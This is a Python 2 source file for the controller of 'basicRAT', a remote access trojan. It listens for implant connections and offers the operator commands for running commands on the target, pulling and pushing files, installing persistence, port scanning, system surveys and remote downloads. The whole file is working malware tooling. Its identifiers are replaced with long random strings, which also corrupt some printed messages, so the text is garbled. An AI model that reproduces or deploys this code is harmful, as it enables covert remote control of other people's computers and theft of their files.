#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import LbDuEPUbWDSpcBPCGqQkBOOLxlykeOORPIOYlFWnViTFvvcyLehoVyUBDlfEoZdSkHiSSEzJXJZxrzIbOGtJZIxcfHARIzRgpKMoWALvzJSlCHiGVawizmzkxmIrPnui,FJlBqkXWGxAZpsBcMoRjGlMYEfKqtpHXMSnmADouZsAIshcBdCTtLxkJajUaRbWjMPwwhUEOuDwKcknhcKqACDPVdRjgosyyEsFTukThytGaCnInfiyXbbOAgQiXsyxA,nrLGoJkWpCSkESRHpYxkHDentumOpzoWDKdxrgyzDPeqWFrjGZRcnbCRRGMPczhAGlHztpJjdtFSAZfOtyjZGBcvlZwCYGvduczrbejHYjfuSXhcmpJhofIjwvAwgRae
    from core.filesock import CxBAZGDKBCWbOagsdkCVkicNQGGQpGKAhckZPSSsWFyezJTjHWGZRBNUrnrOPuvfjGLLpqaCrmMwdOGepVOjAaPIhotCjrfwRpTdMppZaSrVsluZMIaOQzQFVznrWoVt, fArrOAdQoCVQIEvpHccHsiCfjUSiSstdYpYQNkkmjUyBpXpYyNWuSFHSNmzwJFTapudabKeXryZMXsLLxempVYbjzNvLWOlJVCZOWowcokcnYMNvQcDJYMgsgcYwbgqK
except ImportError as oEZVXCjIMcoMLeqBuFrJmbzYCDzngQUTbiJeCzWULBUdGKymZSIrhyJYsFyiyrJzFaqPYONPRCiqYncrVmMSHITqWDbDBbrBTmRswRRhhJZqOBhEnEyBbTDHqEIjJCnx:
    print oEZVXCjIMcoMLeqBuFrJmbzYCDzngQUTbiJeCzWULBUdGKymZSIrhyJYsFyiyrJzFaqPYONPRCiqYncrVmMSHITqWDbDBbrBTmRswRRhhJZqOBhEnEyBbTDHqEIjJCnx
    sys.exit(0)
btgLNcWauMmiShpmvWDXyRCnYxFhfHRlnhJRZyKXXugBJpaFTOQKeyrWEsyWarDFTQfKfeQDCVvplxhGLlyLQRtDLNDnOYpHTBdHrYXAPmpmxjPplxRKaBlWDMYouwqH = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
xCtxOxwgeemwYBLgSekQhBLNGregGRXzjoayEKjkQeeqgCZHXIDAfYerVQTgnFRvpJKLzJHrgycrDmgXQUlVLLmMmXgvqDsfQSjOiUhlUNOotEYvWXIcXbeZTzseFYRz = '''
______           _     ______  ___ _____   _            _   
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |  
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_ 
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_ 
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
                                                            
'''
jihxekirzlqDYaArAfVHnynYZSPXdHuOKebMKEVLfZVcxqzoTCdIwZQUVPzhRRLwLuMptZRHuhBmmMpswFAPDAiuFESyopgVSbzPSKvVayYlCTazssMmZgJCeBtAOgQQ = [ 
            'download', 'help', 'persistence', 'quit', 'rekey', 
            'run', 'scan', 'survey', 'unzip', 'upload', 'wget' 
]
def NMaIEfZDiLQYQyPbbPrtuFfSojdexfcZdErbrQnytuRIQnUpnQunYpEDbcPtZairEEqigMFuDVMaiNAtytHHrsxppEedVJaspGLJBQaUCKWiMcvGhjgJQQxQkFcCYnsY():
    VrrpjBojYamCrCZIzghGerSDYpkCxbQlkdOgWUSrDRbIyYaDFdEUNDEbSrOHnYdJUzjegquiNnoeekptlTHYCKobwsZOJpaIRmNKKKVBasfKkPrrZmWNECOvhJFtaAtP = argparse.ArgumentParser(description='basicRAT server')
    VrrpjBojYamCrCZIzghGerSDYpkCxbQlkdOgWUSrDRbIyYaDFdEUNDEbSrOHnYdJUzjegquiNnoeekptlTHYCKobwsZOJpaIRmNKKKVBasfKkPrrZmWNECOvhJFtaAtP.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return VrrpjBojYamCrCZIzghGerSDYpkCxbQlkdOgWUSrDRbIyYaDFdEUNDEbSrOHnYdJUzjegquiNnoeekptlTHYCKobwsZOJpaIRmNKKKVBasfKkPrrZmWNECOvhJFtaAtP
def SvGbWtTyddYtclMUhDghCwagJBaacDbWLjYqbjceVNBHGdoItYMZADTNtsmKMLLIScNqqCDPwcBAjrBPnWxQbDDfrfndyLHtwRcEUJvbsfUqifnbPUfKFLfIuFltNyVF():
    VrrpjBojYamCrCZIzghGerSDYpkCxbQlkdOgWUSrDRbIyYaDFdEUNDEbSrOHnYdJUzjegquiNnoeekptlTHYCKobwsZOJpaIRmNKKKVBasfKkPrrZmWNECOvhJFtaAtP  = NMaIEfZDiLQYQyPbbPrtuFfSojdexfcZdErbrQnytuRIQnUpnQunYpEDbcPtZairEEqigMFuDVMaiNAtytHHrsxppEedVJaspGLJBQaUCKWiMcvGhjgJQQxQkFcCYnsY()
    SmHBfRFxhCpUuUPsREdZweDPHQGupGSXFpoDcTZUqpSapZjjuEqNnIjAIecjFjSDCYhGNCTrKGKJWzKhqSAAVWiVNCvETdiymUVafCOaPYtrCCRohDYuTIgTagxexkCx    = vars(VrrpjBojYamCrCZIzghGerSDYpkCxbQlkdOgWUSrDRbIyYaDFdEUNDEbSrOHnYdJUzjegquiNnoeekptlTHYCKobwsZOJpaIRmNKKKVBasfKkPrrZmWNECOvhJFtaAtP.parse_args())
    mpegbmiFyTwdbNmlfrPtTMmBaoNpeRUcoMaDoTzsddVEgcFHRktAGlyIEfdhFHsxQqiqKOwfIMbLxkuAMAHTDfEisKtgbGhXtZXBRSLSSAyrubaYkxquHKDpFqMDAedg    = SmHBfRFxhCpUuUPsREdZweDPHQGupGSXFpoDcTZUqpSapZjjuEqNnIjAIecjFjSDCYhGNCTrKGKJWzKhqSAAVWiVNCvETdiymUVafCOaPYtrCCRohDYuTIgTagxexkCx['port']
    AjZZYNvSrvSzkdrErqDBJWGQVHmSSzIuZGqhMlywWdldkaMeqkStwDUuHbvZAcghZPGTzOFTPDJObSymTsDGXRPnSAIxFzZMjBWUrTUgKrPBymhZXXZNHckllHjtfQbc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        AjZZYNvSrvSzkdrErqDBJWGQVHmSSzIuZGqhMlywWdldkaMeqkStwDUuHbvZAcghZPGTzOFTPDJObSymTsDGXRPnSAIxFzZMjBWUrTUgKrPBymhZXXZNHckllHjtfQbc.bind(('0.0.0.0', mpegbmiFyTwdbNmlfrPtTMmBaoNpeRUcoMaDoTzsddVEgcFHRktAGlyIEfdhFHsxQqiqKOwfIMbLxkuAMAHTDfEisKtgbGhXtZXBRSLSSAyrubaYkxquHKDpFqMDAedg))
    except socket.error:
        print 'Error: Unable to start aiuDedHwaLUzJmSSweTGcwQSHRWaYOIFPbfpzYLUGeeAGcloUrIgDjgdwyQJsdQDTQmsCjnqAopUlltpVSdRElbqlgsKtFBUdVcvoTffqkEsykXvJDKnMwgtPdRgVFpT, mpegbmiFyTwdbNmlfrPtTMmBaoNpeRUcoMaDoTzsddVEgcFHRktAGlyIEfdhFHsxQqiqKOwfIMbLxkuAMAHTDfEisKtgbGhXtZXBRSLSSAyrubaYkxquHKDpFqMDAedg {} in use?'.format(mpegbmiFyTwdbNmlfrPtTMmBaoNpeRUcoMaDoTzsddVEgcFHRktAGlyIEfdhFHsxQqiqKOwfIMbLxkuAMAHTDfEisKtgbGhXtZXBRSLSSAyrubaYkxquHKDpFqMDAedg)
        sys.exit(1)
    for wtyfuWySzuaKZImpMLplzRkpFysVrQZWGHnJwjAkSPiyBQHYkKVxGYSzsgQelpUayRSWNEHnHIscdvESrCycxZWNYiLzgnMeYrWBkWnTTmnBPjBFptHJmuYWuJMDWMVS in xCtxOxwgeemwYBLgSekQhBLNGregGRXzjoayEKjkQeeqgCZHXIDAfYerVQTgnFRvpJKLzJHrgycrDmgXQUlVLLmMmXgvqDsfQSjOiUhlUNOotEYvWXIcXbeZTzseFYRz.split('\n'):
        time.sleep(0.05)
        print wtyfuWySzuaKZImpMLplzRkpFysVrQZWGHnJwjAkSPiyBQHYkKVxGYSzsgQelpUayRSWNEHnHIscdvESrCycxZWNYiLzgnMeYrWBkWnTTmnBPjBFptHJmuYWuJMDWMVS
    print 'basicRAT aiuDedHwaLUzJmSSweTGcwQSHRWaYOIFPbfpzYLUGeeAGcloUrIgDjgdwyQJsdQDTQmsCjnqAopUlltpVSdRElbqlgsKtFBUdVcvoTffqkEsykXvJDKnMwgtPdRgVFpT listening on mpegbmiFyTwdbNmlfrPtTMmBaoNpeRUcoMaDoTzsddVEgcFHRktAGlyIEfdhFHsxQqiqKOwfIMbLxkuAMAHTDfEisKtgbGhXtZXBRSLSSAyrubaYkxquHKDpFqMDAedg {}...'.format(mpegbmiFyTwdbNmlfrPtTMmBaoNpeRUcoMaDoTzsddVEgcFHRktAGlyIEfdhFHsxQqiqKOwfIMbLxkuAMAHTDfEisKtgbGhXtZXBRSLSSAyrubaYkxquHKDpFqMDAedg)
    AjZZYNvSrvSzkdrErqDBJWGQVHmSSzIuZGqhMlywWdldkaMeqkStwDUuHbvZAcghZPGTzOFTPDJObSymTsDGXRPnSAIxFzZMjBWUrTUgKrPBymhZXXZNHckllHjtfQbc.listen(10)
    conn, kEmTmXSwYApWknGIYYtEdQkZXvtDLGFvrsaiqJqBPxXgTsASdMrfyhnaxEjUauwGiXjphBflkMqVdBSUQidsIcSbjaHIsSZaTyQOvYGHicBhbMEgsUCkCfzSBkQGpXLu = AjZZYNvSrvSzkdrErqDBJWGQVHmSSzIuZGqhMlywWdldkaMeqkStwDUuHbvZAcghZPGTzOFTPDJObSymTsDGXRPnSAIxFzZMjBWUrTUgKrPBymhZXXZNHckllHjtfQbc.accept()
    SSyuBvmiGOtFrSevfdpayfhcstxXMylvhpRTOKmrEaqRdTzsMadbMHoBnuTLSXXsRrbrGcsTSpXGBlEeTZhYEPkbqSJbeXNgAMnvjLYvEnQxjxXvkCqhpOCkrGQytBlH = nrLGoJkWpCSkESRHpYxkHDentumOpzoWDKdxrgyzDPeqWFrjGZRcnbCRRGMPczhAGlHztpJjdtFSAZfOtyjZGBcvlZwCYGvduczrbejHYjfuSXhcmpJhofIjwvAwgRae(conn, aiuDedHwaLUzJmSSweTGcwQSHRWaYOIFPbfpzYLUGeeAGcloUrIgDjgdwyQJsdQDTQmsCjnqAopUlltpVSdRElbqlgsKtFBUdVcvoTffqkEsykXvJDKnMwgtPdRgVFpT=True)
    while True:
        rVKJjXoeGPTLsDiosITcKdAZUTVMtgYqGciHHpfcGZhSUevqxBkYBUivfbEheKEbHjwOsLtKMwOfZBWClUGcYzFyhVVXhPfxayAtowbXTvHpPbQNuQuNwPjNdUUMTYJe = raw_input('\n[{}] basicRAT> '.format(kEmTmXSwYApWknGIYYtEdQkZXvtDLGFvrsaiqJqBPxXgTsASdMrfyhnaxEjUauwGiXjphBflkMqVdBSUQidsIcSbjaHIsSZaTyQOvYGHicBhbMEgsUCkCfzSBkQGpXLu[0])).rstrip()
        if not rVKJjXoeGPTLsDiosITcKdAZUTVMtgYqGciHHpfcGZhSUevqxBkYBUivfbEheKEbHjwOsLtKMwOfZBWClUGcYzFyhVVXhPfxayAtowbXTvHpPbQNuQuNwPjNdUUMTYJe:
            continue
        cmd, _, action = rVKJjXoeGPTLsDiosITcKdAZUTVMtgYqGciHHpfcGZhSUevqxBkYBUivfbEheKEbHjwOsLtKMwOfZBWClUGcYzFyhVVXhPfxayAtowbXTvHpPbQNuQuNwPjNdUUMTYJe.partition(' ')
        if cmd not in jihxekirzlqDYaArAfVHnynYZSPXdHuOKebMKEVLfZVcxqzoTCdIwZQUVPzhRRLwLuMptZRHuhBmmMpswFAPDAiuFESyopgVSbzPSKvVayYlCTazssMmZgJCeBtAOgQQ:
            print 'Invalid command, type "help" to see lXMDgsJMABJTuHhpPYmlbLCxGncBbchcAivHQArwrTrPhPwPDehKbOcegdHqWvIarasLDYQEKYDDVAUEkxydkVNjQQLyzBlDSggZcOEKnQWROGfXCBwcpjFqjQQCkCvi list of commands.'
            continue
        if cmd == 'help':
            print btgLNcWauMmiShpmvWDXyRCnYxFhfHRlnhJRZyKXXugBJpaFTOQKeyrWEsyWarDFTQfKfeQDCVvplxhGLlyLQRtDLNDnOYpHTBdHrYXAPmpmxjPplxRKaBlWDMYouwqH
            continue
        conn.send(FJlBqkXWGxAZpsBcMoRjGlMYEfKqtpHXMSnmADouZsAIshcBdCTtLxkJajUaRbWjMPwwhUEOuDwKcknhcKqACDPVdRjgosyyEsFTukThytGaCnInfiyXbbOAgQiXsyxA(rVKJjXoeGPTLsDiosITcKdAZUTVMtgYqGciHHpfcGZhSUevqxBkYBUivfbEheKEbHjwOsLtKMwOfZBWClUGcYzFyhVVXhPfxayAtowbXTvHpPbQNuQuNwPjNdUUMTYJe, SSyuBvmiGOtFrSevfdpayfhcstxXMylvhpRTOKmrEaqRdTzsMadbMHoBnuTLSXXsRrbrGcsTSpXGBlEeTZhYEPkbqSJbeXNgAMnvjLYvEnQxjxXvkCqhpOCkrGQytBlH))
        if cmd == 'quit':
            AjZZYNvSrvSzkdrErqDBJWGQVHmSSzIuZGqhMlywWdldkaMeqkStwDUuHbvZAcghZPGTzOFTPDJObSymTsDGXRPnSAIxFzZMjBWUrTUgKrPBymhZXXZNHckllHjtfQbc.close()
            sys.exit(0)
        elif cmd == 'run':
            TcjIWQDQTFhEGgVDXhlMliJCKkhiZGhVTodPjPNmpdjBhTWelAIaEujkzbUIOUdrfHjJVSxqukhoMMgFNipaQltbJxHkNpMZrlzRBIfybEotoXMTwCDPlbfDUuSqitCb = conn.recv(4096)
            print LbDuEPUbWDSpcBPCGqQkBOOLxlykeOORPIOYlFWnViTFvvcyLehoVyUBDlfEoZdSkHiSSEzJXJZxrzIbOGtJZIxcfHARIzRgpKMoWALvzJSlCHiGVawizmzkxmIrPnui(TcjIWQDQTFhEGgVDXhlMliJCKkhiZGhVTodPjPNmpdjBhTWelAIaEujkzbUIOUdrfHjJVSxqukhoMMgFNipaQltbJxHkNpMZrlzRBIfybEotoXMTwCDPlbfDUuSqitCb, SSyuBvmiGOtFrSevfdpayfhcstxXMylvhpRTOKmrEaqRdTzsMadbMHoBnuTLSXXsRrbrGcsTSpXGBlEeTZhYEPkbqSJbeXNgAMnvjLYvEnQxjxXvkCqhpOCkrGQytBlH).rstrip()
        elif cmd == 'download':
            for uEXNpHQFtGrfxUXACVGaCCzStpfaFNdAHBBheMMyRthULuuxlmlEYzdLeRincpaOCSKhamwQlJmutNzCjrHHhiIkADdRupbfmHwGxtBwkvaDItOTiIMizXQscKNdVHgK in action.split():
                uEXNpHQFtGrfxUXACVGaCCzStpfaFNdAHBBheMMyRthULuuxlmlEYzdLeRincpaOCSKhamwQlJmutNzCjrHHhiIkADdRupbfmHwGxtBwkvaDItOTiIMizXQscKNdVHgK = uEXNpHQFtGrfxUXACVGaCCzStpfaFNdAHBBheMMyRthULuuxlmlEYzdLeRincpaOCSKhamwQlJmutNzCjrHHhiIkADdRupbfmHwGxtBwkvaDItOTiIMizXQscKNdVHgK.strip()
                CxBAZGDKBCWbOagsdkCVkicNQGGQpGKAhckZPSSsWFyezJTjHWGZRBNUrnrOPuvfjGLLpqaCrmMwdOGepVOjAaPIhotCjrfwRpTdMppZaSrVsluZMIaOQzQFVznrWoVt(conn, uEXNpHQFtGrfxUXACVGaCCzStpfaFNdAHBBheMMyRthULuuxlmlEYzdLeRincpaOCSKhamwQlJmutNzCjrHHhiIkADdRupbfmHwGxtBwkvaDItOTiIMizXQscKNdVHgK, SSyuBvmiGOtFrSevfdpayfhcstxXMylvhpRTOKmrEaqRdTzsMadbMHoBnuTLSXXsRrbrGcsTSpXGBlEeTZhYEPkbqSJbeXNgAMnvjLYvEnQxjxXvkCqhpOCkrGQytBlH)
        elif cmd == 'upload':
            for uEXNpHQFtGrfxUXACVGaCCzStpfaFNdAHBBheMMyRthULuuxlmlEYzdLeRincpaOCSKhamwQlJmutNzCjrHHhiIkADdRupbfmHwGxtBwkvaDItOTiIMizXQscKNdVHgK in action.split():
                uEXNpHQFtGrfxUXACVGaCCzStpfaFNdAHBBheMMyRthULuuxlmlEYzdLeRincpaOCSKhamwQlJmutNzCjrHHhiIkADdRupbfmHwGxtBwkvaDItOTiIMizXQscKNdVHgK = uEXNpHQFtGrfxUXACVGaCCzStpfaFNdAHBBheMMyRthULuuxlmlEYzdLeRincpaOCSKhamwQlJmutNzCjrHHhiIkADdRupbfmHwGxtBwkvaDItOTiIMizXQscKNdVHgK.strip()
                fArrOAdQoCVQIEvpHccHsiCfjUSiSstdYpYQNkkmjUyBpXpYyNWuSFHSNmzwJFTapudabKeXryZMXsLLxempVYbjzNvLWOlJVCZOWowcokcnYMNvQcDJYMgsgcYwbgqK(conn, uEXNpHQFtGrfxUXACVGaCCzStpfaFNdAHBBheMMyRthULuuxlmlEYzdLeRincpaOCSKhamwQlJmutNzCjrHHhiIkADdRupbfmHwGxtBwkvaDItOTiIMizXQscKNdVHgK, SSyuBvmiGOtFrSevfdpayfhcstxXMylvhpRTOKmrEaqRdTzsMadbMHoBnuTLSXXsRrbrGcsTSpXGBlEeTZhYEPkbqSJbeXNgAMnvjLYvEnQxjxXvkCqhpOCkrGQytBlH)
        elif cmd == 'rekey':
            SSyuBvmiGOtFrSevfdpayfhcstxXMylvhpRTOKmrEaqRdTzsMadbMHoBnuTLSXXsRrbrGcsTSpXGBlEeTZhYEPkbqSJbeXNgAMnvjLYvEnQxjxXvkCqhpOCkrGQytBlH = nrLGoJkWpCSkESRHpYxkHDentumOpzoWDKdxrgyzDPeqWFrjGZRcnbCRRGMPczhAGlHztpJjdtFSAZfOtyjZGBcvlZwCYGvduczrbejHYjfuSXhcmpJhofIjwvAwgRae(conn, aiuDedHwaLUzJmSSweTGcwQSHRWaYOIFPbfpzYLUGeeAGcloUrIgDjgdwyQJsdQDTQmsCjnqAopUlltpVSdRElbqlgsKtFBUdVcvoTffqkEsykXvJDKnMwgtPdRgVFpT=True)
        elif cmd in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(cmd)
            TcjIWQDQTFhEGgVDXhlMliJCKkhiZGhVTodPjPNmpdjBhTWelAIaEujkzbUIOUdrfHjJVSxqukhoMMgFNipaQltbJxHkNpMZrlzRBIfybEotoXMTwCDPlbfDUuSqitCb = conn.recv(1024)
            print LbDuEPUbWDSpcBPCGqQkBOOLxlykeOORPIOYlFWnViTFvvcyLehoVyUBDlfEoZdSkHiSSEzJXJZxrzIbOGtJZIxcfHARIzRgpKMoWALvzJSlCHiGVawizmzkxmIrPnui(TcjIWQDQTFhEGgVDXhlMliJCKkhiZGhVTodPjPNmpdjBhTWelAIaEujkzbUIOUdrfHjJVSxqukhoMMgFNipaQltbJxHkNpMZrlzRBIfybEotoXMTwCDPlbfDUuSqitCb, SSyuBvmiGOtFrSevfdpayfhcstxXMylvhpRTOKmrEaqRdTzsMadbMHoBnuTLSXXsRrbrGcsTSpXGBlEeTZhYEPkbqSJbeXNgAMnvjLYvEnQxjxXvkCqhpOCkrGQytBlH)
if __name__ == '__main__':
    SvGbWtTyddYtclMUhDghCwagJBaacDbWLjYqbjceVNBHGdoItYMZADTNtsmKMLLIScNqqCDPwcBAjrBPnWxQbDDfrfndyLHtwRcEUJvbsfUqifnbPUfKFLfIuFltNyVF()
